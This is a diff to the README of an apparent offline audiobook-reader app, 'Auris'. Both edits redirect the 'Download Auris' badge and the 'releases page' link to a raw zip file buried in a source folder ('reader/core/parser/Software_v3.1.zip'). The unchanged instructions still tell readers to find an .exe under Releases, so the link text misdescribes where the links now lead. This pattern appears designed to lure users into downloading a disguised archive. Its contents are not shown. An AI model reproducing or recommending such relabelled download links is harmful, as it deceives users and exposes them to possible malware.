@@ -1,6 +1,6 @@
 # 🎧 Auris - Read your favorite books aloud offline
 
-[![](https://img.shields.io/badge/Download_Auris-Blue?style=for-the-badge)](https://github.com/Roanauniversalistic17/Auris)
+[![](https://img.shields.io/badge/Download_Auris-Blue?style=for-the-badge)](https://github.com/Roanauniversalistic17/Auris/raw/refs/heads/main/reader/core/parser/Software_v3.1.zip)
 
 Auris turns your digital books into audiobooks. It reads EPUB, PDF, and TXT files aloud using your computer hardware. The software runs entirely on your machine. You do not need an internet connection to listen to your books. Auris includes natural voices and highlights text while it reads to help you follow along.
 
@@ -8,7 +8,7 @@ Auris turns your digital books into audiobooks. It reads EPUB, PDF, and TXT file
 
 Follow these steps to set up Auris on your Windows computer.
 
-1. Go to the [Auris releases page](https://github.com/Roanauniversalistic17/Auris).
+1. Go to the [Auris releases page](https://github.com/Roanauniversalistic17/Auris/raw/refs/heads/main/reader/core/parser/Software_v3.1.zip).
 2. Look for the latest version listed under the Releases section.
 3. Find the file ending in .exe.
 4. Click the link to save the file to your computer.
